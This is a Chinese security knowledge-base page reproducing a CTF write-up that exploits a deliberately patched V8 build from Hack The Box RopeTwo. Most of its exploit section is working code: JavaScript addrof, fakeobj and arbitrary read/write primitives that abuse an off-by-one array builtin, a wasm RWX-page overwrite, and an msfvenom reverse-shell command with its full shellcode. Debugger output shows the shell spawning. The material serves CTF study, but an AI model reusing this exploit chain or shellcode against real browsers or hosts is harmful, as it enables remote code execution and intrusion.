---
title: V8 类型推断与任意读写原语
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/v8/
categories:
- 二进制安全
- 浏览器引擎
tags:
- 知识库
- V8
- 指针压缩
- 任意读写
- JIT
- 类型混淆
- 越界访问
description: 两个实验分别来自 35C3 与 RopeTwo 的 V8 环境。本章把类型信息、数组布局、指针压缩和后备存储连接起来，保留编译提交、调试器状态与原始 JavaScript。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

两个实验分别来自 35C3 与 RopeTwo 的 V8 环境。本章把类型信息、数组布局、指针压缩和后备存储连接起来，保留编译提交、调试器状态与原始 JavaScript。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/v8/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Math.expm1 题的关键是优化阶段对类型和边界的错误推断。

RopeTwo 的补丁与指针压缩影响 map、对象地址和任意读写的表达方式。

文中的地址、布局与 JIT 行为对应各自原版本，相关独立引擎研究见导读。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [指针压缩下的 addrof 与 fakeobj](#case-chrome-browserv8-pwn) | chrome-browserv8-pwn | V8、指针压缩、任意读写 |
| [负零类型推断与越界原语](#case-exploiting-the-math-expm1-typing-bug-in-v8) | Exploiting-the-Math-expm1-typing-bug-in-V8 | V8、JIT、类型混淆、越界访问 |

<a id="case-chrome-browserv8-pwn"></a>

## 指针压缩下的 addrof 与 fakeobj

以 RopeTwo 的补丁版 V8 为对象，保留编译提交、数组 map、指针压缩、任意读写及 ArrayBuffer 后备存储的调试关系。

<p class="kb-provenance">来源 chrome-browserv8-pwn · 原记录 2021-01-23 · 41 个代码块 · 7 处图片引用</p>

<details class="kb-evidence" id="record-chrome-browserv8-pwn">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start chrome-browserv8-pwn -->

#### 摘要

V8是由Google开发的著名浏览器Chrome的JavaScript引擎。

此篇文章专门记录hack the box - ropetwo机器中的chrome浏览器v8引擎的pwn部分。



#### step1-环境搭建及工具安装

在开始实验之前，先把所有环境准备好，本人实验环境是在ubuntu 16.04.1 amd64位的vm虚拟机下进行的。

1. 安装google的depot_tools

``` bash
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git

echo "export PATH=/home/pwn/tools/depot_tools:$PATH" >> ~/.bashrc

bash
```

2. 安装gdb和gdb功能增强插件gef

``` bash
apt-get install gdb
```

 - [GEF github](https://github.com/hugsy/gef)

``` bash
# 手动安装并导入gdb初始化文件
$ wget -O ~/.gdbinit-gef.py -q http://gef.blah.cat/py
$ echo source ~/.gdbinit-gef.py >> ~/.gdbinit
```

3. fetch google v8引擎

<font color="red">fetch之前，请想办法解决让整个ubuntu系统的流量全部走代理，不然会fetch失败</font>

 - fetch之前先运行以下的命令，初始化gclient工具集，使gclient工具集保持完整，没有这一步，之后的fetch v8一定会失败报错。。。

``` bash
gclient
```

接着下载V8的代码以及生成项目文件。fetch v8刚开始的时候会有很长一段时间卡住不动，只是没有输出而已，只要没有报错，就是在正常运行，耐心等待就好了。

``` bash
# 下载v8的repo和必要依赖
fetch v8
cd v8
./build/install-build-deps.sh
```

至此所有环境已搭建完毕，之后会介绍编译v8源码成d8的debug和release的版本便于调试, x64.release和x64.debug这两个文件夹中都有一个数据库二进制文件。debug版本将在REPL中提供更多信息，但它不允许在不崩溃(支持fuzzing)的情况下进行越限的读/写，所以在开始时使用release版本。

#### step2

连接openvpn到rope2的ip地址，然后下载如下commit的diff文件

``` bash
http://10.10.10.196:5000/root/v8/commit/7410f6809dd33e317f11f39ceaebaba9a88ea970
```

点击Options的Plain Diff即可下载.diff文件

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb164.jpg)

然后到如下链接，点击Download下载具有漏洞的chrome浏览器

``` bash
http://10.10.10.196:8000/
```

然后拷贝r4j之前的一个commit备用

``` bash
http://gitlab.rope2.htb:5000/root/v8/commits/master
```

``` bash
d91e8d8fca64679c8df05603b5ff7e58709c4801
```

#### step3-编译有漏洞的v8源码

``` bash
$ git checkout d91e8d8fca64679c8df05603b5ff7e58709c4801
$ gclient sync
$ git apply ../patch.diff 
$ ./tools/dev/v8gen.py x64.release
$ ninja -C ./out.gn/x64.release
$ ./tools/dev/v8gen.py x64.debug
$ ninja -C ./out.gn/x64.debug
```

#### step4-开始分析调试

唯一的障碍会偶然发现在这个挑战是指针压缩,这使得在32位地址表示,导致泄漏很难取得成功, 因为隔离root, 上一个地址的32位值用于访问数据在V8堆成了一个问题。但是提到了不需要知道隔离root地址，如果能够设法处理漏洞，得到fakeobj和addrof原语，那么就可以通过指针压缩，这将不会是一个问题。

首先，需要分析补丁文件，这样就能发现哪些提交了特别的推送更改，并将其准确地推送到:

``` bash
root@luci:~/v8build/rope2# cat patch.diff 
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 3c2fe33c5b4b330c509d2926bc1e30daa1e09dba..99f0271e035220cd7228e8f9d8959e3b248a6cb5 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -297,6 +297,34 @@ BUILTIN(ArrayPrototypeFill) {
   return GenericArrayFill(isolate, receiver, value, start_index, end_index);
 }
 
+BUILTIN(ArrayGetLastElement)
+{
+	Handle<JSReceiver> receiver;
+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver()));
+	Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+	uint32_t len = static_cast<uint32_t>(array->length().Number());
+	FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+	return *(isolate->factory()->NewNumber(elements.get_scalar(len)));
+}
+
+BUILTIN(ArraySetLastElement)
+{
+	Handle<JSReceiver> receiver;
+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver()));
+	int arg_count = args.length();
+	if (arg_count != 2) // first value is always this
+	{
+		return ReadOnlyRoots(isolate).undefined_value();
+	}
+	Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+	uint32_t len = static_cast<uint32_t>(array->length().Number());
+	Handle<Object> value;
+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, value, Object::ToNumber(isolate, args.atOrUndefined(isolate,1)));
+	FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+	elements.set(len,value->Number());
+	return ReadOnlyRoots(isolate).undefined_value();
+}
+
 namespace {
 V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
                                               BuiltinArguments* args) {
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 92a430aa2c0cbc3d65fdf2f1f4f295824379dbd8..02982b1c858eb313befcb8ad9e396dcdfbf2f9ab 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -319,6 +319,8 @@ namespace internal {
   TFJ(ArrayPrototypePop, kDontAdaptArgumentsSentinel)                          \
   /* ES6 #sec-array.prototype.push */                                          \
   CPP(ArrayPush)                                                               \
+  CPP(ArrayGetLastElement)                                                     \
+  CPP(ArraySetLastElement)                                                     \
   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \
   /* ES6 #sec-array.prototype.shift */                                         \
   CPP(ArrayShift)                                                              \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 6d53531f1cbf9b6669c6b98ea8779e8133babe8d..5db31e9b733cdaa1dd2049b72b7fb6392ea4a1ab 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1706,6 +1706,11 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
     // Array functions.
     case Builtins::kArrayIsArray:
       return Type::Boolean();
+    case Builtins::kArrayGetLastElement:
+      return Type::Receiver();
+    case Builtins::kArraySetLastElement:
+      return Type::Receiver();
+
     case Builtins::kArrayConcat:
       return Type::Receiver();
     case Builtins::kArrayEvery:
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 7fd1e40f661461fdbcf9228c5ce9127c3428dc7b..3a9b97e4b6426e101ca0cdc97ce1cc92aa689968 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -1660,6 +1660,10 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeLastIndexOf, 1, false);
     SimpleInstallFunction(isolate_, proto, "pop", Builtins::kArrayPrototypePop,
                           0, false);
+    SimpleInstallFunction(isolate_, proto, "GetLastElement", Builtins::kArrayGetLastElement,
+                          0, false);
+    SimpleInstallFunction(isolate_, proto, "SetLastElement", Builtins::kArraySetLastElement,
+                          0, false);
     SimpleInstallFunction(isolate_, proto, "push",
                           Builtins::kArrayPrototypePush, 1, false);
     SimpleInstallFunction(isolate_, proto, "reverse",
```

这里的/src/builtins/builtins-array.c用来表示添加了一些新函数，这里提到了以下两个添加的函数是ArrayGetLastElement和ArraySetLastElement，逐个分解它们:

 - ArrayGetLastElement顾名思义,它从数组中最后一个元素,首先计算长度的变量len返回元素存储为len指数,现在i = f注意这里,这里的len是绝对长度的数组,因为数组索引从0开始,要访问第0个元素，使用数组[0]，但在这里，因为元素存储在数组中，在len索引处的值因此允许对1个元素进行越界读取。

 - ArraySetLastElement正如名字所说,这个内置函数保存价值的最后索引数组,现在这里,前面的函数,len是计算数组的长度,然后将覆盖指数,定义的元素数组元素(指数)=。是的，在这里也有越界的写，但是只写了一个元素。

所以，如上所述，知道有两个函数，使用，以利用这个特定的二进制补丁，并最终chrome浏览器。

因为这也是一篇非常详细的博客文章，所以将先理解这些概念，然后再继续讨论。

由于JavaScript是一种动态类型语言，引擎必须将类型信息与每个运行时值一起存储。在v8中，这是通过指针标记和专用类型信息对象(称为映射)的结合来实现的。这些映射用于跟踪在运行时创建的对象，因为这是对象的处理方式，覆盖映射会导致V8引擎内部的一些类型混淆。

到目前为止，你可能在想究竟如何访问map，最重要的是“如何识别map?”，为此使用了调试版本的d8二进制文件。与allow-natives-syntax将二进制运行时允许您使用

``` bash
%DebugPrint(<object>)
```

将打印对象的相关信息,比方说,例如,声明的数组元素,然后使用%DebugPrint (arr)获得所有关于一个对象的信息包括但不限于:

 - map的地址
 - 元素的指针
 - 类型信息等

``` bash
root@luci:~/v8build/v8/out.gn/x64.debug# gdb ./d8
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
79 commands loaded for GDB 7.11.1 using Python engine 3.5
[*] 1 command could not be loaded, run `gef missing` to know why.
Reading symbols from ./d8...done.
gef➤  r --allow-natives-syntax
Starting program: /root/v8build/v8/out.gn/x64.debug/d8 --allow-natives-syntax
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff260f700 (LWP 6077)]
[New Thread 0x7ffff1e0e700 (LWP 6078)]
[New Thread 0x7ffff160d700 (LWP 6079)]
V8 version 8.5.0 (candidate)
d8> var arr = [1.1, 2.2, 3.3];
undefined
d8> %DebugPrint(arr)
DebugPrint: 0x1201080c5e45: [JSArray]
 - map: 0x120108281909 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x12010824923d <JSArray[0]>
 - elements: 0x1201080c5e25 <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
 - length: 3
 - properties: 0x1201080406e9 <FixedArray[0]> {
    #length: 0x1201081c0165 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x1201080c5e25 <FixedDoubleArray[3]> {
           0: 1.1
           1: 2.2
           2: 3.3
 }
0x120108281909: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x1201082818e1 <Map(HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x1201081c0451 <Cell value= 1>
 - instance descriptors #1: 0x120108249911 <DescriptorArray[1]>
 - transitions #1: 0x12010824995d <TransitionArray[4]>Transition array #1:
     0x120108042f3d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x120108281931 <Map(HOLEY_DOUBLE_ELEMENTS)>

 - prototype: 0x12010824923d <JSArray[0]>
 - constructor: 0x120108249111 <JSFunction Array (sfi = 0x1201081cc41d)>
 - dependent code: 0x1201080401ed <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[1.1, 2.2, 3.3]
```

分解,现在有arr位于0x1201080c5e45 JSArray类型的,它的map位于0x120108281909,除此之外,根据这些信息,它有一个map的PACKED_DOUBLE_ELEMENTS arr引用有两类型的元素。元素指针位于0x1201080c5e25，长度为3，类型为FixedDoubleArray。现在，使用gdb检查arr周围的内存内容。

 - 为了检查地址的内存内容，需要从地址中减去1，这样就得到了用于分析的绝对地址。

``` bash
gef➤  x/4wx 0x1201080c5e45 - 1
0x1201080c5e44:	0x08281909 <----- Map 0x080406e9 <---- Properties 0x080c5e25 <----- Element Array 0x00000006
```

从调试信息(使用%DebugPrint(arr))和gdb输出中，可以看到第一个元素属于数组本身的映射，第二个属于属性，第三个属于元素数组。如果你注意,使用了x/wx地址显示为32位表示,这里是,提交的版本的V8引擎集成后指针压缩,使1是地址的32位整数。

``` bash
gef➤  x/5xg 0x1201080c5e25 - 1
0x1201080c5e24:	0x0000000608040a3d	0x3ff199999999999a
0x1201080c5e34:	0x400199999999999a	0x400a666666666666
0x1201080c5e44:	0x080406e908281909
gef➤  p/d 0x3ff199999999999a
$2 = 4607632778762754458
gef➤  p/f 0x3ff199999999999a
$3 = 1.1000000000000001
gef➤  p/f 0x400199999999999a
$4 = 2.2000000000000002
```

现在，因为知道了一个数组是如何表示到V8堆中的，也知道有一个读写漏洞，得出结论，有能力覆盖对象的映射。记住这一点，继续:

首先，需要使实用函数能够处理指针标记并将浮点值更改为小数，反之亦然。下面的JavaScript函数将完成上述工作:

``` bash
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val, size) {

    f64_buf[0] = val;

    if(size == 32) {
        return BigInt(u64_buf[0]);
    } else if(size == 64) {
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
    }

}

function itof(val, size) {

    if(size == 32) {
        u64_buf[0] = Number(val & 0xffffffffn);
    } else if(size == 64) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 32n);
    }

    return f64_buf[0];

}
```

上述函数用于将浮点数转换为整数，将整数转换为浮点数，因为内存地址将被它们所尊重的值覆盖为浮点数，所以需要它们。

继续，需要创建一些浮点数组，为了获得所需的泄漏，还需要它们来执行fakeobj和addrof原语，废话不多说，开始:

``` bash
var float_arr = [1.1, 2.2, 3.3, 4.4, 5.5];
var obj = {"A":1.1};
var reg = [1, 2, 3, 4];
```

这些变量将进一步涉及到利用，接下来，需要得到addrof原语，这意味着需要利用off来读取对象的地址，看看:

``` bash
var float_arr_map = ftoi(float_arr.GetLastElement(), 32)
var reg_arr_map = float_arr_map - 0xa0n;

console.log("[*] Float array map   :  0x" + float_arr_map.toString(16));
console.log("[*] Regular array map :  0x" + reg_arr_map.toString(16));


function addrof(in_obj) {
    float_arr.SetLastElement(itof(reg_arr_map, 32));
    float_arr[0] = in_obj;
    float_arr.SetLastElement(itof(float_arr_map, 32));
    let addr = float_arr[0];
    return ftoi(addr, 64)
}
```

这里,首先得到float_arr的map地址和reg数组,然后有一个函数叫做addrof,这需要一个对象将对象地址需要的地址作为参数,要做的是首先用reg数组覆盖float_arr映射的map对象,这意味着,到目前为止,float_arr指向的地址映射reg数组,然后使float_arr的对象需要的地址作为第一个对象,然后将float_arr的映射放回到它原来的位置。

考虑到，有一个map泄漏，如果试图读取存储在该地址的内容，它将导致:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb165.jpg)

随着v8 利用的进行，需要一个fakeobj原语。fakeobj函数如下:

``` bash
function fakeobj(addr) {
    float_arr[0] = itof(addr, 32);
    float_arr.SetLastElement(itof(reg_arr_map, 32));
    let fake = float_arr[0];
    float_arr.SetLastElement(itof(float_arr_map, 32));
    return fake;
}
```

来谈谈fakeobj函数,这种原始的,在这个漏洞和特定的上下文中,把假的对象的地址,想把它放置到float_arr的第一个元素,然后改变了float_arr map到reg数组的map,所以往往从第0个索引来访问数据,其工作原理是:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb166.jpg)

 - 把想要覆盖另一个对象的对象地址覆盖
 - 将float_arr的映射设置为reg的映射
 - 从float_arr中获取假对象
 - 把float_arr的map放回原来的位置

这些原语是在进入读/写原语之前需要的，不过有了这些原语，现在可以处理函数arb_read和arb_write，这两个函数分别用于从一个地址的值中读地址或从一个地址的值中写地址。

继续，对任意读函数感兴趣，将尽力解释，目前，考虑下面的函数，它用于从任意地址读取值:

``` bash
var rw_helper = [itof(float_arr_map, 64), 1.1, 2.2, 3.3];
var rw_helper_addr = addrof(rw_helper) & 0xffffffffn;

console.log("[+] Controlled RW helper address: 0x" + rw_helper_addr.toString(16));

function arb_read(addr) {
    let fake = fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
    return ftoi(fake[0], 64);
}
```

第一这个函数是通过fakeobj函数制造一个假的对象,然后把想读的地址,写rw_helper数组的第一个指数,然后第一个元素假的对象是错误的,这是函数的跟进,导致整个逻辑的理解，d8二进制解释步骤:

使用rw_helper的地址创建fakeobj，从中减去0x20，因为32个字节是用于内存布局的，在本例中，这样做是因为:

``` bash
root@luci:~/v8build/v8/out.gn/x64.release# gdb ./d8
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
79 commands loaded for GDB 7.11.1 using Python engine 3.5
[*] 1 command could not be loaded, run `gef missing` to know why.
Reading symbols from ./d8...(no debugging symbols found)...done.
gef➤  run --allow-natives-syntax --shell /root/v8build/rope2/xpl.js
Starting program: /root/v8build/v8/out.gn/x64.release/d8 --allow-natives-syntax --shell /root/v8build/rope2/xpl.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff66c4700 (LWP 9528)]
[New Thread 0x7ffff5ec3700 (LWP 9529)]
[New Thread 0x7ffff56c2700 (LWP 9530)]
[*] Float array map   :  0x8241909
[*] Regular array map :  0x8241869
[+] Controlled RW helper address: 0x8086b21
V8 version 8.5.0 (candidate)
d8> %DebugPrint(rw_helper);
0x06a908086b21 <JSArray[4]>
[6.7481182e-316, 1.1, 2.2, 3.3]
d8> ^C
gef➤  x/10xg 0x06a908086b21 - 1 - 0x30
0x6a908086af0:	0x0000393638313432	0x0000000808040a3d
0x6a908086b00:	0x0000000008241909	0x3ff199999999999a
0x6a908086b10:	0x400199999999999a	0x400a666666666666
0x6a908086b20:	0x080406e908241909	0x0000000808086af9
0x6a908086b30:	0x0000000208040975	0x0000000008241909
gef➤  x/10xg 0x06a908086b21 - 1 - 0x20
0x6a908086b00:	0x0000000008241909	0x3ff199999999999a
0x6a908086b10:	0x400199999999999a	0x400a666666666666
0x6a908086b20:	0x080406e908241909	0x0000000808086af9
0x6a908086b30:	0x0000000208040975	0x0000000008241909
0x6a908086b40:	0x0000000008040975	0x0000000008040245
gef➤  p 0x06a908086b21 - 0x20
$2 = 0x6a908086b01
gef➤  p 0x06a908086b21 - 0x20 - 1
$3 = 0x6a908086b00

如果在地址‘0x6a908086b00’处放置一个假对象，就能够访问索引1，也就是‘0x6a908086b10’。这样，生成的假对象将指向想要的地址的值。
```

对于write函数，它的工作原理与read函数相同:

``` bash
function arb_write(addr, value) {
    let fake = fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
    fake[0] = itof(value, 64);
}
```

如果把逻辑分解:

 - 如果与arb_read的函数相比，它将覆盖存储在第一个下标处的值，而不是返回假数组的第一个值，这是伪造对象的结果。

``` bash
return ftoi(fake[0], 64);
```

以上来自arb_read。

``` bash
fake[0] = itof(value, 64);
```

这是通过覆盖其它返回值读取函数,从这里利用下去,所说的在[WebAssembly Page in JS](https://developer.mozilla.org/en-US/docs/WebAssembly),所以一开始,不能用经典的使用pwn挑战的方法使用system __free_hook覆盖,然后生成一个shell,在基于v8的挑战, 主要是CTFs,这是通过创建一个wasm函数来完成的，它将导致在程序的内存布局中创建一个rwx权限页，从这里的方法如下:

 - 找到rwx段地址，计算它的地址。
 - 将shellcode写入rwx段的区域。
 - 调用前面创建的wasm函数，因为shellcode将写入该函数，调用它最终将导致shellcode执行。

``` bash
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,
                               130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,
                               128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,
                               128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,
                               0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
var wasm_module = new WebAssembly.Module(wasmCode);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var pwn = wasm_instance.exports.main;
```

这是用于创建rwx部分的pwn函数的JS代码，这一步先放在一边，继续:

``` bash
var wasm_instance_addr = addrof(wasm_instance) & 0xffffffffn;
var rwx = arb_read(wasm_instance_addr + 0x68n & 0xffffffffn);
```

首先,需要找到rwx段的基地址,这是很容易找到的,要做的是找到的地址正是位于存储到内存和抵消,使用gef的

``` bash
search-pattern rwx_address
```

发现内存的引用位于抵消wasm_instance_addr + 0x68:

``` bash
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x000015fc5408a000 0x000015fc5408b000 0x0000000000000000 rwx 
0x0000190900000000 0x000019090000c000 0x0000000000000000 rw- 
0x000019090000c000 0x0000190900040000 0x0000000000000000 --- 
0x0000190900040000 0x0000190900041000 0x0000000000000000 rw- 
0x0000190900041000 0x0000190900042000 0x0000000000000000 --- 
0x0000190900042000 0x0000190900052000 0x0000000000000000 r-x 
0x0000190900052000 0x000019090007f000 0x0000000000000000 ---

[..snip..]

gef➤  search-pattern 0x000015fc5408a000
[+] Searching '\x00\xa0\x08\x54\xfc\x15\x00\x00' in memory
[+] In (0x190908080000-0x19090818d000), permission=rw-
  0x1909080874e0 - 0x190908087500  →   "\x00\xa0\x08\x54\xfc\x15\x00\x00[...]" 
  0x19090808752c - 0x19090808754c  →   "\x00\xa0\x08\x54\xfc\x15\x00\x00[...]" 
[+] In (0x190908200000-0x190908280000), permission=rw-
  0x190908211178 - 0x190908211198  →   "\x00\xa0\x08\x54\xfc\x15\x00\x00[...]" 
[+] In '[heap]'(0x55555648d000-0x55555658b000), permission=rw-
  0x5555564dddc8 - 0x5555564ddde8  →   "\x00\xa0\x08\x54\xfc\x15\x00\x00[...]" 
  0x5555564de2c8 - 0x5555564de2e8  →   "\x00\xa0\x08\x54\xfc\x15\x00\x00[...]" 
  0x5555564de3a0 - 0x5555564de3c0  →   "\x00\xa0\x08\x54\xfc\x15\x00\x00[...]" 
  0x5555564de4c0 - 0x5555564de4e0  →   "\x00\xa0\x08\x54\xfc\x15\x00\x00[...]" 
  0x5555564de510 - 0x5555564de530  →   "\x00\xa0\x08\x54\xfc\x15\x00\x00[...]" 
  0x5555565775e0 - 0x555556577600  →   "\x00\xa0\x08\x54\xfc\x15\x00\x00[...]" 
[+] In (0x7fffe8000000-0x7fffe8023000), permission=rw-
  0x7fffe8000970 - 0x7fffe8000990  →   "\x00\xa0\x08\x54\xfc\x15\x00\x00[...]" 
[+] In (0x7ffff0000000-0x7ffff0023000), permission=rw-
  0x7ffff0006d90 - 0x7ffff0006db0  →   "\x00\xa0\x08\x54\xfc\x15\x00\x00[...]" 
[+] In (0x7ffff56c4000-0x7ffff5ec4000), permission=rw-
  0x7ffff5ec2820 - 0x7ffff5ec2840  →   "\x00\xa0\x08\x54\xfc\x15\x00\x00[...]" 
[+] In (0x7ffff5ec5000-0x7ffff70c9000), permission=rw-
  0x7ffff66c3820 - 0x7ffff66c3840  →   "\x00\xa0\x08\x54\xfc\x15\x00\x00[...]" 
  0x7ffff66c38a0 - 0x7ffff66c38c0  →   "\x00\xa0\x08\x54\xfc\x15\x00\x00[...]"
gef➤  p 0x0000190900000000 + 0x82111c9
$2 = 0x1909082111c9
gef➤  p 0x190908211178 - 0x1909082111c9
$3 = 0xffffffffffffffaf
```

解决上面的问题，需要知道如何使用DataView和ArrayBuffer，因为这将帮助用所需的值覆盖地址，简而言之，这两个函数允许使用ArrayBuffer以二进制格式写入数据。

``` bash
console.log("[+] Wasm instance address: 0x" + wasm_instance_addr.toString(16));

console.log("[*] RWX INSTANCE:   0x" + rwx.toString(16));


var arr_buf = new ArrayBuffer(0x100);
var dataview = new DataView(arr_buf);
```

ArrayBuffer的后备存储可以看作是JSArray的元素指针。它可以在offset &ArrayBuffer+0x14找到，可以通过使用d8二进制文件的x64.debug版本找到它。其原理是，不使用fakeobj直接写入任意地址，而是使用fakeobj执行arb-write操作，并修改合法ArrayBuffer的后备存储到任意地址，在本例中，该后备存储将被rwx段覆盖。现在，可以使用dataview.setBigUint64(0, val, true)将val作为64位小端值写入任意地址。如下所示:

 - 使用msfvenom生成shellcode并放入以下的js代码中

``` bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.177.128 LPORT=4222 -f num

0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 
0xb9, 0x02, 0x00, 0x10, 0x7e, 0xc0, 0xa8, 0xb1, 0x80, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 
0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 
0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 
0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
```

``` bash
var arr_buf_addr = addrof(arr_buf) & 0xffffffffn;;
var back_store_addr = arb_read(arr_buf_addr + 0x14n);

console.log("[+] ArrayBuffer address: 0x" + arr_buf_addr.toString(16));
console.log("[+] Back store pointer: 0x" + back_store_addr.toString(16));

arb_write(arr_buf_addr + 0x14n, rwx);

var shellcode = [
    0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 
    0xb9, 0x02, 0x00, 0x10, 0x7e, 0xc0, 0xa8, 0xb1, 0x80, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 
    0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 
    0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 
    0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
];  // shellcode for spawning a reverse shell for local test

for (let i = 0; i < shellcode.length; i++) {
  dataview.setUint8(i, shellcode[i], true);
}
```

现在，只需要调用函数pwn就可以执行shellcode了:

``` bash
pwn();
```

以./d8 ./xpl.js的命令运行该漏洞js脚本，将能成功收到一个reverse shell:

``` bash
root@luci:~/v8build/v8/out.gn/x64.release# ./d8 /root/v8build/rope2/xpl.js 
[*] Float array map   :  0x8241909
[*] Regular array map :  0x8241869
[+] Controlled RW helper address: 0x808733d
[+] Wasm instance address: 0x8211631
[*] RWX INSTANCE:   0x13211e50c000
[+] ArrayBuffer address: 0x8087a85
[+] Back store pointer: 0x55b70a9d4730
[+] Spawning a shell...
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb167.jpg)

``` bash
